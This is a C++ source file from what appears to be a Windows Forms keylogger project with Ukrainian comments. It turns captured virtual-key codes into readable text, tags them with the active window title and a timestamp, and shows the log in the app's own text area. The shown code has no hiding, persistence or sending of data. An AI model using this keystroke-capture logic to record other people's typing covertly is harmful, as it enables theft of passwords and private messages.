#include "KeyLogger.h"
#include "Buttons.h"
#include "StatusProgresBar.h"
#include "StatusLabel.h"
#include "WindowsNameComboBox.h"
#include <string>
#include <stdio.h>
#include <stdlib.h>


KeyLogger* KeyLogger::instance = nullptr;

void KeyLogger::log(std::string message)
{
	std::ostringstream oss;
	int key_stroke = atoi(message.c_str());
    if (logSettings->getLoggerState() == KeyLoggerState::LOG_TO_TEXT_AREA) {
		char lastwindow[256];

		if ((key_stroke == 1) || (key_stroke == 2))
			return; // ігнорувати клацання мишкою

		HWND foreground = GetForegroundWindow();
		//DWORD threadID;
		//HKL layout = GetKeyboardLayout(0);
		//
		//if (foreground) {
		//	//get keyboard layout of the thread
		//	threadID = GetWindowThreadProcessId(foreground, NULL);
		//	//layout = GetKeyboardLayout(GetWindowThreadProcessId(GetForegroundWindow(), NULL));
		//	layout = GetKeyboardLayout(threadID);
		//	std::cout << std::endl << layout << std::endl;
		//}

		//HKL layout{};
		//GUITHREADINFO gti{ sizeof(GUITHREADINFO) };
		//if (GetGUIThreadInfo(NULL, &gti)) //Get keyboard layout of the foreground thread
		//	layout = GetKeyboardLayout(GetWindowThreadProcessId(gti.hwndFocus, NULL));
		//else
		//	layout = GetKeyboardLayout(NULL); //Get keyboard layout of this thread (always const)


		StatusProgresBar::getProgressBar()->Value = 0;
		StatusLabelToolStrip::getToolStripStatusLabel()->Text = "0%";


		HKL layout{};
		GUITHREADINFO gti{ sizeof(GUITHREADINFO) };
		if (GetGUIThreadInfo(NULL, &gti)) // отримати розкладку клавіатури потоку переднього плану
			layout = GetKeyboardLayout(GetWindowThreadProcessId(GetForegroundWindow(), NULL));
		else
			layout = GetKeyboardLayout(NULL); // отримати розкладку клавіатури цього потоку (завжди є const)
		
		if (foreground)
		{
			char window_title[256];
			GetWindowText(foreground, window_title, 256);

			if (strcmp(window_title, lastwindow) != 0) {
				strcpy_s(lastwindow, window_title);

				// отримати час
				time_t t = time(NULL);
				struct tm* tm = localtime(&t);
				char s[64];
				strftime(s, sizeof(s), "%c", tm);

				oss << "\n\n[Window: " << window_title << " - at " << s << "] ";
				//WindowsNameComboBox::getComboBox()->Items[1] = "windows_title";
			}
		}

		if (key_stroke == VK_BACK)
			oss << "[BACKSPACE]";
		else if (key_stroke == VK_RETURN)
			oss << "\n";
		else if (key_stroke == VK_SPACE) {
			oss << "[SPACE]";
			//Buttons::getButton()->Text = "Ya";
		}
		else if (key_stroke == VK_TAB)
			oss << "[TAB]";
		else if (key_stroke == VK_SHIFT || key_stroke == VK_LSHIFT || key_stroke == VK_RSHIFT)
			oss << "[SHIFT]";
		else if (key_stroke == VK_CONTROL || key_stroke == VK_LCONTROL || key_stroke == VK_RCONTROL)
			oss << "[CONTROL]";
		else if (key_stroke == VK_ESCAPE)
			oss << "[ESCAPE]";
		else if (key_stroke == VK_END)
			oss << "[END]";
		else if (key_stroke == VK_HOME)
			oss << "[HOME]";
		else if (key_stroke == VK_LEFT)
			oss << "[LEFT]";
		else if (key_stroke == VK_UP)
			oss << "[UP]";
		else if (key_stroke == VK_RIGHT)
			oss << "[RIGHT]";
		else if (key_stroke == VK_DOWN)
			oss << "[DOWN]";
		else if (key_stroke == 190 || key_stroke == 110)
			oss << ".";
		else if (key_stroke == 189 || key_stroke == 109)
			oss << "-";
		else if (key_stroke == 20)
			oss << "[CAPSLOCK]";
		else {
			char key;
			// перевірка Caps Lock
			bool lowercase = ((GetKeyState(VK_CAPITAL) & 0x0001) != 0);

			// перевірка клавіші shift
			if ((GetKeyState(VK_SHIFT) & 0x1000) != 0 || (GetKeyState(VK_LSHIFT) & 0x1000) != 0 || (GetKeyState(VK_RSHIFT) & 0x1000) != 0) {
				lowercase = !lowercase;
			}

			// відображати віртуальну клавішу відповідно до розкладки клавіатури
			//key = MapVirtualKeyExA(key_stroke, MAPVK_VK_TO_CHAR, layout);
			key = MapVirtualKeyExW(key_stroke, MAPVK_VK_TO_CHAR, layout);

			
			//tolower converts it to lowercase properly
			// tolower правильно перетворює його на lowercase
			if (!lowercase) key = tolower(key);
			oss << char(key);
			char symbol = char(key);
			std::string str;
			str.push_back(symbol);
			std::string str2;
			//str2 = CastingUtils::castAsString(Buttons::getButton()->Text);
			
			//if (str == CastingUtils::castAsString(Buttons::getButtonD()->Text)) {
			//	Buttons::getButtonD()->FlatAppearance->BorderSize = 3;
			//}

			//if (str == CastingUtils::castAsString(Buttons::getButton()->Text)) {
			//	Buttons::getButton()->FlatAppearance->BorderSize = 3;
			//}

			//if (str == CastingUtils::castAsString(Buttons::getButtonF()->Text)) {
			//	Buttons::getButtonF()->FlatAppearance->BorderSize = 3;
			//	//Sleep(3000);
			//}
		}
		
		//Sleep(2 * 1000);
		
		//Sleep(5000);
		//Buttons::getButton()->BackColor = System::Drawing::Color::Black;
		//Buttons::getButtonD()->FlatAppearance->BorderSize = 1;
		//std::this_tgread
		
		KeyLoggedAreaHolder::getLoggedArea()->Text += CastingUtils::castAsString(oss.str()) + "\n";
		//Sleep(1000);
		/*Buttons::getButtonF()->Visible = false;
		Buttons::getButtonF()->FlatAppearance->BorderSize = 1;
		Buttons::getButtonF()->Visible = true;*/
		StatusProgresBar::getProgressBar()->Value = 100;
		StatusLabelToolStrip::getToolStripStatusLabel()->Text = "100%";

    }
}

KeyLogger* KeyLogger::getInstance()
{
    if (instance == nullptr) {
        instance = new KeyLogger();
    }
    return instance;
}
